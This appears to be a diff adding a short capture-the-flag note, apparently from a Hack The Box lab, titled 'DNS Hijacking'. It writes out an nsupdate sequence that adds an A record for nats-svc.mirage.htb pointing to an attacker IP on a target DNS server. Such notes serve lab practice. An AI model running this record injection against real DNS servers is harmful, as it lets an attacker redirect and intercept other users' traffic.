@@ -1,0 +1,9 @@
+---------------------------
+      DNS Hijacking
+---------------------------
+
+
+nsupdate
+> server <target ip>
+> update add nats-svc.mirage.htb 3600 A <attacker ip>
+> send
